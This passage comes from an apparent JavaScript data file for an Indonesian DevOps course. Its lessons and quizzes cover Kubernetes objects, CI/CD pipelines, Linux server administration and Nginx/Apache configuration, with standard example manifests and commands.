Docker memungkinkan developer "build once, run anywhere". Dengan memahami Dockerfile, multi-stage build, compose, dan praktik keamanan, Anda dapat membangun aplikasi yang portable, efisien, dan aman. Container adalah blok bangunan microservice modern—dan Docker adalah tools de facto untuk membangun blok tersebut.`,
    quiz: [
      {
        question: "Perbedaan utama container vs VM?",
        options: ["Container butuh OS sendiri", "Container sharing kernel host", "VM lebih ringan", "Tidak ada bedanya"],
        answer: 1,
        explanation: "Container berbagi kernel host via namespace, sehingga lebih ringan dari VM."
      },
      {
        question: "Strategi Dockerfile untuk image akhir kecil dan aman?",
        options: ["Single stage dengan ubuntu", "Multi-stage build", "Pakai image latest", "Tanpa USER directive"],
        answer: 1,
        explanation: "Multi-stage build mengcopy hanya artifact final ke image runtime kecil."
      },
      {
        question: "Best practice user di container production?",
        options: ["Root", "Non-root user", "Sudo group", "Tidak perlu user"],
        answer: 1,
        explanation: "Jalankan container sebagai non-root user untuk membatasi dampak kompromi."
      }
    ]
  },
  {
    level: 7,
    order: 4,
    title: "Kubernetes Orchestration",
    slug: "kubernetes-orchestration",
    description: "Pod, Deployment, Service, dan orchestration di Kubernetes.",
    icon: "☸️",
    isProject: false,
    content: `# Kubernetes Orchestration

**Kubernetes (K8s)** adalah platform open-source untuk orchestrasi container yang berasal dari Google. K8s mengotomatiskan deployment, scaling, dan manajemen aplikasi containerized di skala besar. Saat aplikasi tumbuh dari puluhan menjadi ribuan container lintas beberapa node, diperlukan orchestrator—dan K8s adalah standar industri.

![Kubernetes Orchestration](https://sfile.chatglm.cn/images-ppt/631c50fce301.jpg)

## Arsitektur Kubernetes

### Control Plane (Master)
- **API Server** — entry point semua perintah (kubectl, dashboard).
- **etcd** — key-value store konsisten (state cluster).
- **Scheduler** — memilih node untuk Pod baru.
- **Controller Manager** — menjaga desired state (Deployment, ReplicaSet).
- **Cloud Controller** — integrasi dengan cloud provider.

### Worker Node
- **kubelet** — agent yang memastikan container running sesuai spec.
- **kube-proxy** — networking & load balancing antar Pod.
- **Container Runtime** — containerd, CRI-O (Docker deprecated sejak v1.24).

## Objek Inti Kubernetes

### Pod
Unit terkecil yang dapat di-deploy. Satu atau lebih container yang share network namespace & storage.

### Deployment
Mengelola ReplicaSet untuk memastikan jumlah Pod replika yang diinginkan.

\`\`\`yaml
# deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: api
  labels: {app: api}
spec:
  replicas: 3
  selector:
    matchLabels: {app: api}
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1
      maxUnavailable: 0
  template:
    metadata:
      labels: {app: api}
    spec:
      containers:
      - name: api
        image: registry.example.com/api:v1.2.3
        ports: [{containerPort: 3000}]
        env:
        - name: DATABASE_URL
          valueFrom: {secretKeyRef: {name: db-secret, key: url}}
        resources:
          requests: {cpu: 100m, memory: 128Mi}
          limits: {cpu: 500m, memory: 512Mi}
        livenessProbe:
          httpGet: {path: /health, port: 3000}
          initialDelaySeconds: 10
          periodSeconds: 10
        readinessProbe:
          httpGet: {path: /ready, port: 3000}
          periodSeconds: 5
\`\`\`

### Service
Abstraksi network untuk mengakses Pod (yang IP-nya berubah). Tipe: ClusterIP (default, internal), NodePort, LoadBalancer, ExternalName.

\`\`\`yaml
apiVersion: v1
kind: Service
metadata:
  name: api
spec:
  selector: {app: api}
  ports:
  - port: 80
    targetPort: 3000
  type: ClusterIP
\`\`\`

### Ingress
HTTP/HTTPS routing dari eksternal ke Service.

\`\`\`yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: api-ingress
  annotations:
    cert-manager.io/cluster-issuer: letsencrypt
spec:
  tls:
  - hosts: [api.example.com]
    secretName: api-tls
  rules:
  - host: api.example.com
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service: {name: api, port: {number: 80}}
\`\`\`

### ConfigMap & Secret

\`\`\`yaml
# ConfigMap untuk konfigurasi non-sensitif
apiVersion: v1
kind: ConfigMap
metadata: {name: api-config}
data:
  LOG_LEVEL: "info"
  config.yaml: |
    feature_flags:
      new_dashboard: true

---
# Secret untuk data sensitif (base64 encoded)
apiVersion: v1
kind: Secret
metadata: {name: db-secret}
type: Opaque
stringData:
  url: "postgresql://app:s3cret@db:5432/app"
\`\`\`

## Perintah kubectl

\`\`\`bash
# Apply manifest
kubectl apply -f deployment.yaml -f service.yaml
kubectl apply -f ./manifests/             # direktori

# Inspect
kubectl get pods -o wide
kubectl describe pod api-xxxx
kubectl logs -f api-xxxx
kubectl exec -it api-xxxx -- sh

# Scale & rollout
kubectl scale deployment api --replicas=5
kubectl rollout status deployment/api
kubectl rollout undo deployment/api
kubectl rollout history deployment/api

# Debug
kubectl get events --sort-by='.lastTimestamp'
kubectl top pods
kubectl auth can-i create deployments
\`\`\`

## Namespaces & RBAC

Namespaces membagi cluster menjadi lingkungan virtual (dev/staging/prod). RBAC mengatur siapa boleh apa.

\`\`\`yaml
# ServiceAccount + Role + RoleBinding untuk aplikasi
apiVersion: v1
kind: ServiceAccount
metadata: {name: api-sa, namespace: prod}
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: {name: config-reader, namespace: prod}
rules:
- apiGroups: [""]
  resources: ["configmaps"]
  verbs: ["get", "list"]
\`\`\`

## StatefulSet & DaemonSet

- **StatefulSet** — Pod dengan identitas stabil (nama, network, storage). Cocok untuk database (MySQL, Cassandra, Kafka).
- **DaemonSet** — Pod berjalan di setiap node (node-exporter, log agent, CNI).

## Helm Package Manager

\elm chart = kumpulan manifest template + values.yaml.

\`\`\`bash
helm repo add bitnami https://charts.bitnami.com/bitnami
helm install my-release bitnami/postgresql \\
  --set auth.postgresPassword=secret \\
  --set primary.persistence.size=20Gi

helm upgrade my-release bitnami/postgresql -f values.yaml
helm rollback my-release 1
\`\`\`

## Operator & Custom Resource

Operator adalah pola untuk mengelola aplikasi stateful kompleks (database failover, backup) dengan Custom Controller + Custom Resource Definition (CRD). Contoh: Prometheus Operator, Cert-Manager, ArgoCD.

## Tips & Best Practices

- Set **resource requests & limits** untuk semua container (mencegah noisy neighbor).
- Gunakan **liveness & readiness probe** agar K8s tahu kapan restart / mulai menerima traffic.
- **PodDisruptionBudget** untuk memastikan minimal replika saat maintenance.
- Pakai **namespaces** untuk isolasi environment/team.
- **GitOps** dengan ArgoCD/Flux—deklarasi state cluster via Git.
- **Policy as Code** dengan Kyverno/OPA Gatekeeper.
- Scan image di CI/CD sebelum deploy.

## Kesimpulan

Kubernetes adalah tools powerful dengan learning curve curam. Investasi mempelajari Pod, Deployment, Service, Ingress, dan Helm terbayar saat aplikasi mencapai skala di mana manual management tidak feasible. Dengan disiplin resource limits, probe, dan GitOps, K8s memberi platform yang dapat diandalkan untuk microservice modern. Mulai dari managed K8s (EKS/GKE/AKS) untuk fokus pada aplikasi, bukan operasional cluster.`,
    quiz: [
      {
        question: "Unit terkecil yang dapat di-deploy di Kubernetes?",
        options: ["Container", "Pod", "Node", "Deployment"],
        answer: 1,
        explanation: "Pod adalah unit terkecil; dapat berisi satu atau lebih container yang share network."
      },
      {
        question: "Tipe Service yang mengekspos Pod ke eksternal via HTTP routing?",
        options: ["ClusterIP", "NodePort", "Ingress", "Headless"],
        answer: 2,
        explanation: "Ingress mengatur HTTP/HTTPS routing dari eksternal ke Service."
      },
        {
        question: "Tools package manager Kubernetes yang populer?",
        options: ["kubectl", "Helm", "Docker Compose", "kubeadm"],
        answer: 1,
        explanation: "Helm adalah package manager untuk chart (template manifest Kubernetes)."
      }
    ]
  },
  {
    level: 7,
    order: 5,
    title: "CI/CD Pipeline",
    slug: "ci-cd-pipeline",
    description: "Continuous integration & deployment, pipeline otomatis, dan tools.",
    icon: "🔄",
    isProject: false,
    content: `# CI/CD Pipeline

**CI/CD** (Continuous Integration / Continuous Delivery / Continuous Deployment) adalah praktik mengotomatiskan build, test, dan deployment aplikasi. CI memastikan setiap commit terintegrasi dan teruji; CD mengantarkan perubahan yang lulus uji ke produksi dengan aman dan cepat. CI/CD adalah pilar DevOps yang memungkinkan tim merilis fitur puluhan kali sehari dengan risiko rendah.

![CI/CD Pipeline](https://sfile.chatglm.cn/images-ppt/631c50fce301.jpg)

## Tahapan Pipeline

### 1. Source (Commit)
Trigger saat developer push ke repository (Git). Semua pipeline bermula dari event ini.

### 2. Build
Kompilasi kode, install dependency, build artifact (Docker image, jar, binary, npm package).

### 3. Test
- **Unit test** — cepat, isolasi, mock dependency.
- **Integration test** — dengan database/service asli (atau test container).
- **Static analysis** — linting (ESLint, pylint, golangci-lint).
- **Security scan** — SAST (Semgrep, CodeQL), SCA (Snyk, Dependabot), secret scan (gitleaks).
- **E2E test** — alur pengguna penuh (Cypress, Playwright).

### 4. Package
Build & push Docker image ke registry dengan tag unik (git SHA + semantic version).

### 5. Deploy to Staging
Auto-deploy ke environment staging untuk pengujian lebih lanjut.

### 6. Acceptance/Smoke Test
Validasi post-deployment di staging—API contract, smoke test kritis.

### 7. Deploy to Production
- **Continuous Delivery**: manual approval sebelum prod.
- **Continuous Deployment**: otomatis bila semua stage lulus.
- Strategi: blue-green, canary, rolling.

### 8. Post-Deploy Monitoring
Observability: error rate, latency, business metrics. Rollback otomatis bila SLO dilanggar.

## Contoh Pipeline GitHub Actions

\`\`\`yaml
# .github/workflows/ci.yml
name: CI/CD
on:
  push: {branches: [main]}
  pull_request: {branches: [main]}

permissions:
  contents: read
  id-token: write   # untuk OIDC ke AWS

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    - uses: actions/setup-node@v4
      with:
        node-version: '20'
        cache: 'npm'
    - run: npm ci
    - run: npm run lint
    - run: npm test -- --coverage
    - uses: codecov/codecov-action@v4
    - name: SAST
      uses: github/codeql-action/init@v3
    - uses: github/codeql-action/analyze@v3

  build-push:
    needs: test
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    - uses: docker/setup-buildx-action@v3
    - uses: docker/login-action@v3
      with: {registry: ghcr.io, username: \${{github.actor}}, password: \${{secrets.GITHUB_TOKEN}}}
    - uses: docker/build-push-action@v5
      with:
        push: true
        tags: |
          ghcr.io/\${{github.repository}}:\${{github.sha}}
          ghcr.io/\${{github.repository}}:latest
        cache-from: type=gha
        cache-to: type=gha,mode=max

  deploy:
    needs: build-push
    runs-on: ubuntu-latest
    environment: production
    steps:
    - uses: actions/checkout@v4
    - name: Configure AWS credentials
      uses: aws-actions/configure-aws-credentials@v4
      with:
        role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy
        aws-region: ap-southeast-1
    - name: Deploy to EKS
      run: |
        aws eks update-kubeconfig --name prod-cluster
        sed -i "s|IMAGE_TAG|\${{ github.sha }}|" k8s/deployment.yaml
        kubectl apply -f k8s/
        kubectl rollout status deployment/api -n prod
\`\`\`

## GitOps dengan ArgoCD

GitOps menyatakan desired state cluster di Git, dan operator (ArgoCD/Flux) menyinkronkan. Keuntungan: audit trail, mudah rollback (git revert), drift detection.

\`\`\`yaml
# ArgoCD Application
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata: {name: api, namespace: argocd}
spec:
  project: default
  source:
    repoURL: https://github.com/org/k8s-manifests
    targetRevision: main
    path: prod/api
  destination:
    server: https://kubernetes.default.svc
    namespace: prod
  syncPolicy:
    automated: {prune: true, selfHeal: true}
    syncOptions: [CreateNamespace=true]
\`\`\`

## Strategi Deployment

### Blue-Green
Dua environment identik. Switch traffic seketika. Rollback = switch balik.

### Canary
Rilis ke persentase kecil pengguna (1% → 10% → 50% → 100%), pause untuk observasi.

### Rolling
Update Pod bertahap (maxUnavailable + maxSurge). Default K8s Deployment.

### Feature Flags
Decouple deploy dari release—fitur bisa diaktifkan per-user setelah deploy (LaunchDarkly, Unleash).

## Tools CI/CD Populer

| Tool | Karakteristik |
|------|--------------|
| **GitHub Actions** | Native GitHub, marketplace besar, YAML |
| **GitLab CI** | All-in-one GitLab, runner self-hosted |
| **Jenkins** | Veteran, plugin raksasa, script Groovy |
| **CircleCI** | Cloud-native, orb reusable |
| **ArgoCD / Flux** | GitOps untuk K8s |
| **Tekton** | Kubernetes-native CI/CD |
| **AWS CodePipeline** | Integrasi mendalam dengan layanan AWS |

## Keamanan dalam Pipeline (DevSecOps)

- **SAST** di setiap PR (CodeQL, Semgrep, SonarQube).
- **SCA** untuk dependency (Dependabot, Snyk, Trivy).
- **Secret scan** (gitleaks, TruffleHog) untuk mencegah leak credential.
- **Container scan** sebelum push (Trivy, Grype).
- **DAST** di staging (OWASP ZAP, Nuclei).
- **Signed artifact** (Cosign, Sigstore) untuk supply chain security.
- **OIDC federation** — hapus long-lived credential, pakai short-lived token.

## Tips & Best Practices

- Pipeline harus **cepat** (< 10 menit idealnya). Paralelkan jobs.
- Cache dependency (npm, pip, Docker layer) untuk mempercepat.
- Fail fast: jalankan test paling cepat & paling mungkin gagal lebih dulu.
- Setiap stage menghasilkan **artifact** yang dapat ditelusuri (git SHA, build ID).
- Sembunyikan secret via secret manager pipeline, jangan hardcode.
- Pipeline idempoten—bisa dijalankan ulang dengan hasil sama.
- Pisahkan deployment dari release (feature flags).

## Kesimpulan

CI/CD adalah tulang punggung rekayasa perangkat lunak modern. Dengan pipeline otomatis, test menyeluruh, dan deployment strategis, tim dapat merilis dengan kepercayaan diri tinggi dan risiko rendah. Kuncinya: **automasi segalanya, observasi setiap langkah, dan rollback mudah**. Investasi pada pipeline matang terbayar dalam kualitas, kecepatan, dan ketenangan pikiran.`,
    quiz: [
      {
        question: "Apa perbedaan Continuous Delivery vs Continuous Deployment?",
        options: ["Tidak ada beda", "Delivery butuh approval manual, Deployment otomatis", "Deployment untuk staging", "Delivery hanya build"],
        answer: 1,
        explanation: "Continuous Delivery butuh approval manual ke prod; Continuous Deployment otomatis jika lulus uji."
      },
      {
        question: "Strategi deploy yang merilis ke persentase kecil pengguna dulu?",
        options: ["Blue-green", "Canary", "Rolling", "Recreate"],
        answer: 1,
        explanation: "Canary deploy bertahap (1% → 10% → 100%) untuk meminimalkan risiko."
      },
      {
        question: "Pendekatan yang menyatakan desired state K8s via Git?",
        options: ["DevOps", "GitOps", "NoOps", "SecOps"],
        answer: 1,
        explanation: "GitOps menggunakan Git sebagai single source of truth untuk state cluster."
      }
    ]
  },
  {
    level: 7,
    order: 6,
    title: "Linux Server Administration",
    slug: "linux-server-administration",
    description: "Manajemen user, permission, service systemd, dan hardening server.",
    icon: "🐧",
    isProject: false,
    content: `# Linux Server Administration

Linux mendominasi server—dari VPS kecil hingga data center berskala hyperscale. Menjadi administrator Linux yang kompeten membutuhkan pemahaman user management, permission, service systemd, networking, storage, dan hardening keamanan. Materi ini mengupas keterampilan inti yang wajib dikuasai setiap DevOps/SRE.

![Linux Server Administration](https://sfile.chatglm.cn/images-ppt/631c50fce301.jpg)

## User & Group Management

Setiap proses berjalan sebagai user. User root (UID 0) punya hak mutlak—jarang dipakai langsung.

\`\`\`bash
# Tambah user dengan home & shell
sudo useradd -m -s /bin/bash budi
sudo passwd budi

# Tambah ke group (mis. sudo/docker)
sudo usermod -aG sudo,docker budi

# Lock/unlock akun
sudo usermod -L budi      # lock
sudo usermod -U budi      # unlock

# Hapus user + home
sudo userdel -r budi

# Lihat info user
id budi
groups budi
getent passwd budi
\`\`\`

## File Permission & Ownership

Setiap file punya permission untuk owner, group, others: read (r=4), write (w=2), execute (x=1).

\`\`\`bash
# Lihat permission
ls -l /etc/passwd
# -rw-r--r-- 1 root root 3056 Jan 1 10:00 /etc/passwd

# Ubah permission simbolik
chmod u+x script.sh          # +x untuk owner
chmod g-w file.txt           # -w untuk group
chmod 750 script.sh          # rwxr-x---

# Ubah owner
sudo chown budi:dev file.txt
sudo chown -R budi:dev /srv/app/    # recursive

# ACL (granular)
sudo setfacl -m u:ci:rx /srv/app/
getfacl /srv/app/

# Special permission
chmod u+s /usr/bin/passwd    # setuid
chmod g+s /shared/            # setgid (new file inherit group)
chmod +t /tmp                 # sticky bit
\`\`\`

## systemd Service Management

systemd adalah init system modern di hampir semua distro mainstream.

\`\`\`bash
# Service control
sudo systemctl start nginx
sudo systemctl stop nginx
sudo systemctl restart nginx
sudo systemctl reload nginx   # tanpa downtime
sudo systemctl enable nginx   # start saat boot
sudo systemctl disable nginx
sudo systemctl status nginx

# Log dengan journalctl
journalctl -u nginx -f         # follow
journalctl -u nginx --since "1 hour ago"
journalctl -p err -b           # error sejak boot
journalctl --vacuum-time=7d    # rotasi

# List units
systemctl list-units --type=service --state=running
\`\`\`

### Custom systemd unit

\`\`\`ini
# /etc/systemd/system/api.service
[Unit]
Description=My API Service
After=network.target postgresql.service

[Service]
Type=simple
User=api
Group=api
WorkingDirectory=/srv/api
EnvironmentFile=/etc/api/api.env
ExecStart=/usr/bin/node /srv/api/dist/main.js
Restart=on-failure
RestartSec=5s

# Hardening
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/var/log/api
CapabilityBoundingSet=
AmbientCapabilities=
LimitNOFILE=65536

[Install]
WantedBy=multi-user.target
\`\`\`

\`\`\`bash
sudo systemctl daemon-reload
sudo systemctl enable --now api
\`\`\`

## Package Management

\`\`\`bash
# Debian/Ubuntu
sudo apt update && sudo apt upgrade -y
sudo apt install nginx
sudo apt remove nginx
apt list --installed
apt-cache search keyword
dpkg -L nginx              # file dari package

# RHEL/CentOS/Fedora
sudo dnf install nginx
sudo dnf update
dnf history

# Paket universal: snap, flatpak
sudo snap install code --classic
\`\`\`

## Networking

\`\`\`bash
# IP & interface
ip addr show
ip link set eth0 up/down

# Routing
ip route
sudo ip route add 10.0.0.0/24 via 192.168.1.1

# Koneksi aktif
ss -tunap | grep ESTABLISHED

# DNS
cat /etc/resolv.conf
dig example.com +short
host example.com

# Firewall (ufw di Ubuntu)
sudo ufw default deny incoming
sudo ufw allow 22/tcp
sudo ufw allow 80,443/tcp
sudo ufw enable
sudo ufw status verbose

# Firewall (firewalld di RHEL)
sudo firewall-cmd --permanent --add-service=https
sudo firewall-cmd --reload
\`\`\`

## Storage & Filesystem

\`\`\`bash
# Disk & partition
lsblk
sudo fdisk -l
sudo parted /dev/sdb print

# Format & mount
sudo mkfs.ext4 /dev/sdb1
sudo mkdir /data
sudo mount /dev/sdb1 /data

# fstab (persistent)
echo "/dev/sdb1 /data ext4 defaults,noatime 0 2" | sudo tee -a /etc/fstab
sudo mount -a   # test fstab

# LVM (Logical Volume Manager)
sudo pvcreate /dev/sdb
sudo vgcreate vg_data /dev/sdb
sudo lvcreate -L 50G -n lv_data vg_data

# Disk usage
df -hT
du -sh /var/log/*
ncdu /                  # interactive
\`\`\`

## Process & Resource Management

\`\`\`bash
# Top process
top -o %CPU
htop
ps aux --sort=-%mem | head

# Cari & kill process
pgrep -f "node.*api"
pkill -f "node.*api"
kill -9 12345

# Limit resource (cgroups via systemd atau ulimit)
ulimit -n      # file descriptor
ulimit -u      # max user processes

# Nice & renice (CPU priority)
nice -n 10 backup.sh
renice -5 -p 12345
\`\`\`

## Hardening Keamanan

1. **Update rutin** — \`unattended-upgrades\` untuk security patch otomatis.
2. **SSH hardening** — disable root login, password auth; pakai key-only + MFA.
3. **Fail2ban** — ban IP yang brute-force.
4. **Auditd** — syscall audit untuk compliance.
5. **AppArmor/SELinux** — mandatory access control.
6. **Lynis** — audit keamanan otomatis.

\`\`\`bash
# /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
AllowUsers budi deploy
Port 22
MaxAuthTries 3
ClientAliveInterval 300
ClientAliveCountMax 0

sudo systemctl reload sshd
\`\`\`

\`\`\`bash
# Audit keamanan dengan Lynis
sudo apt install lynis
sudo lynis audit system --quick
\`\`\`

## Tips & Best Practices

- Gunakan **configuration management** (Ansible, Chef, Puppet) untuk konsistensi.
- Aktifkan **NTP/chrony** agar waktu sinkron (krusial untuk log & TLS).
- Setup **logrotate** agar log tidak memenuhi disk.
- **Sudo** dengan \`sudo -l\` untuk audit hak; hindari \`sudo su -\`.
- Monitor dengan **Prometheus node_exporter** + alerting.
- Backup konfigurasi penting ke Git atau S3.

## Kesimpulan

Linux server administration adalah keterampilan fondasi yang membuka pintu untuk DevOps, SRE, dan cloud engineering. Dengan menguasai user, permission, systemd, networking, dan hardening, Anda dapat menjalankan server yang andal, aman, dan efisien. Disiplin konfigurasi reproducible (IaC) dan monitoring proaktif membedakan admin biasa dari engineer kelas produksi.`,
    quiz: [
      {
        question: "Permission numerik 750 berarti?",
        options: ["rwxrwxrwx", "rwxr-x---", "rwxr--r--", "rw-r-----"],
        answer: 1,
        explanation: "750 = rwx (7) untuk owner, r-x (5) untuk group, --- (0) untuk others."
      },
      {
        question: "Perintah untuk melihat dan follow log service systemd?",
        options: ["tail -f /var/log/syslog", "journalctl -u nginx -f", "dmesg", "cat /var/log/nginx.log"],
        answer: 1,
        explanation: "journalctl -u <service> -f mengikuti log service secara real-time."
      },
      {
        question: "Praktik SSH hardening yang paling direkomendasikan?",
        options: ["Enable root login dengan password", "Key-only + disable root login", "Port 22 default tanpa firewall", "Password pendek mudah diingat"],
        answer: 1,
        explanation: "Key-only authentication + disable root login mengurangi risiko brute force."
      }
    ]
  },
  {
    level: 7,
    order: 7,
    title: "Web Server Nginx Apache",
    slug: "web-server-nginx-apache",
    description: "Konfigurasi Nginx dan Apache, virtual host, TLS, dan reverse proxy.",
    icon: "🌐",
    isProject: false,
    content: `# Web Server Nginx & Apache

Web server adalah tulang punggung internet—menerima HTTP request, mengembalikan response, dan mengelola koneksi klien. Dua web server paling populer di Linux adalah **Apache HTTP Server** (veteran sejak 1995) dan **Nginx** (sejak 2004, fokus pada event-driven). Memahami keduanya, konfigurasinya, dan kapan memilih salah satu adalah keterampilan inti web administrator.

![Web Server Nginx Apache](https://sfile.chatglm.cn/images-ppt/631c50fce301.jpg)

## Nginx vs Apache

| Aspek | Apache | Nginx |
|-------|--------|-------|
| Arsitektur | Process/Thread per koneksi | Event-driven async |
| Static file | Cepat | Sangat cepat |
| Dynamic | .htaccess, mod_php | Reverse proxy ke backend |
| Konfigurasi | .htaccess per dir (overhead) | Centralized |
| Memory | Tinggi per koneksi | Konsisten rendah |
| Best fit | Shared hosting, dynamic content | Reverse proxy, high traffic |

Banyak setup modern mengombinasi: **Nginx sebagai front (static + reverse proxy)** → **Apache/Node/Python di belakang**.

## Instalasi

\`\`\`bash
# Ubuntu/Debian
sudo apt update && sudo apt install -y nginx
sudo systemctl enable --now nginx

# Apache
sudo apt install -y apache2

# Verifikasi
curl -I http://localhost/
nginx -t         # test config
apache2ctl configtest
\`\`\`

## Nginx: Konfigurasi Dasar

File utama: \`/etc/nginx/nginx.conf\`. Site config: \`/etc/nginx/sites-available/\` (symlink ke \`sites-enabled/\`).

\`\`\`nginx
# /etc/nginx/sites-available/example.com
server {
    listen 80;
    listen [::]:80;
    server_name example.com www.example.com;
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    server_name example.com www.example.com;

    ssl_certificate     /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers off;
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 1d;

    # Security headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Content-Security-Policy "default-src 'self'" always;

    root /var/www/example.com;
    index index.html index.htm;

    location / {
        try_files $uri $uri/ =404;
    }

    location /api/ {
        proxy_pass http://127.0.0.1:3000;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_read_timeout 60s;
    }

    # Cache static asset
    location ~* \\.(js|css|png|jpg|jpeg|gif|svg|woff2?)$ {
        expires 1y;
        add_header Cache-Control "public, immutable";
        access_log off;
    }

    # Gzip
    gzip on;
    gzip_vary on;
    gzip_min_length 1024;
    gzip_types text/plain text/css application/json application/javascript text/xml;

    client_max_body_size 20m;

    access_log /var/log/nginx/example.access.log;
    error_log  /var/log/nginx/example.error.log warn;
}
\`\`\`

\`\`\`bash
# Aktifkan site
sudo ln -s /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl reload nginx

# Dapatkan sertifikat TLS gratis
sudo certbot --nginx -d example.com -d www.example.com
\`\`\`

## Apache: Virtual Host

\`\`\`apache
# /etc/apache2/sites-available/example.com.conf
<VirtualHost *:80>
    ServerName example.com
    ServerAlias www.example.com
    Redirect permanent / https://example.com/
</VirtualHost>

<VirtualHost *:443>
    ServerName example.com
    DocumentRoot /var/www/example.com

    SSLEngine on
    SSLCertificateFile      /etc/letsencrypt/live/example.com/fullchain.pem
    SSLCertificateKeyFile   /etc/letsencrypt/live/example.com/privkey.pem

    <Directory /var/www/example.com>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    ErrorLog  \${APACHE_LOG_DIR}/example.error.log
    CustomLog \${APACHE_LOG_DIR}/example.access.log combined

    # Reverse proxy ke backend Node
    ProxyPreserveHost On
    ProxyPass        /api/ http://127.0.0.1:3000/
    ProxyPassReverse /api/ http://127.0.0.1:3000/
</VirtualHost>
\`\`\`

\`\`\`bash
sudo a2enmod ssl proxy proxy_http rewrite headers
sudo a2ensite example.com
sudo apache2ctl configtest && sudo systemctl reload apache2
\`\`\`

## Reverse Proxy & Load Balancing

Nginx sangat populer sebagai reverse proxy + load balancer:

\`\`\`nginx
upstream api_backend {
    least_conn;
    server 10.0.0.10:3000 max_fails=3 fail_timeout=30s;
    server 10.0.0.11:3000 max_fails=3 fail_timeout=30s;
    server 10.0.0.12:3000 backup;
    keepalive 32;
}

server {
    listen 443 ssl http2;
    # ... SSL config ...

    location / {
        proxy_pass http://api_backend;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_next_upstream error timeout http_502 http_503;
    }
}
\`\`\`

## Performance Tuning

\`\`\`nginx
# /etc/nginx/nginx.conf (worker section)
worker_processes auto;
worker_rlimit_nofile 65535;

events {
    worker_connections 8192;
    multi_accept on;
    use epoll;
}

http {
    sendfile on;
    tcp_nopush on;
    tcp_nodelay on;
    keepalive_timeout 65;
    keepalive_requests 1000;
    reset_timedout_connection on;

    # Open file cache
    open_file_cache max=10000 inactive=20s;
    open_file_cache_valid 30s;
    open_file_cache_min_uses 2;
    open_file_cache_errors on;

    # Buffer
    client_body_buffer_size 16k;
    client_header_buffer_size 1k;
    large_client_header_buffers 4 8k;
}
\`\`\`

Tuning kernel Linux pendukung:

\`\`\`bash
# /etc/sysctl.d/99-webserver.conf
net.core.somaxconn = 4096
net.ipv4.tcp_max_syn_backlog = 8192
net.ipv4.tcp_tw_reuse = 1
net.ipv4.ip_local_port_range = 1024 65535
net.core.netdev_max_backlog = 16384
fs.file-max = 2097152

sudo sysctl --system
\`\`\`

## Keamanan & Hardening

- Hapus server tokens: \`server_tokens off;\` di nginx, \`ServerTokens Prod\` di Apache.
- Pakai TLS 1.2/1.3 saja, hapus TLS 1.0/1.1.
- Aktifkan OCSP stapling.
- Set HSTS dengan preload.
- Rate limiting di Nginx: \`limit_req_zone\`.
- WAF: ModSecurity + OWASP CRS, atau Cloudflare di depan.

\`\`\`nginx
# Rate limiting
limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;

server {
    location /api/ {
        limit_req zone=api burst=20 nodelay;
        proxy_pass http://api_backend;
    }
}
\`\`\`

## Debugging

\`\`\`bash
# Test config
nginx -t
apache2ctl configtest

# Lihat active connections
ss -tnp | grep nginx

# Real-time access log
tail -f /var/log/nginx/access.log

# Analyze log dengan goaccess
goaccess /var/log/nginx/access.log --log-format=COMBINED -o report.html

# Cek TLS
openssl s_client -connect example.com:443 -servername example.com < /dev/null 2>/dev/null | openssl x509 -noout -dates -issuer

# Test SSL grade
curl https://www.ssllabs.com/ssltest/analyze.html?d=example.com
\`\`\`

## Tips & Best Practices

- Pisahkan config per site di \`sites-available\` (mudah manage).
- Reload (bukan restart) bila memungkinkan—no downtime.
- Logrotate otomatis untuk log akses/error.
- Gunakan \`include\` untuk snippet yang reusable (proxy, ssl, security headers).
- Monitoring dengan Prometheus nginx_exporter + Grafana.
- Automasi via Ansible untuk konsistensi multi-server.

## Kesimpulan

Nginx dan Apache adalah dua pilar web server di Linux. Pilihan tergantung use case: Nginx unggul sebagai reverse proxy dan serving static file, Apache fleksibel untuk hosting dinamis dengan .htaccess. Menguasai virtual host, TLS, reverse proxy, dan performance tuning membuat Anda mampu menjalankan aplikasi web produksi yang andal dan cepat. Keamanan (TLS modern, headers, rate limiting) adalah kewajiban, bukan opsional.`,
    quiz: [
      {
        question: "Web server yang menggunakan arsitektur event-driven async?",
        options: ["Apache", "Nginx", "IIS", "Tomcat"],
        answer: 1,
        explanation: "Nginx event-driven async, lebih efisien memori pada koneksi banyak."
      },
      {
        question: "Direktif Nginx untuk mengarahkan /api ke backend Node di port 3000?",
        options: ["rewrite /api http://localhost:3000", "proxy_pass http://127.0.0.1:3000", "redirect /api 3000", "alias /api 3000"],
        answer: 1,
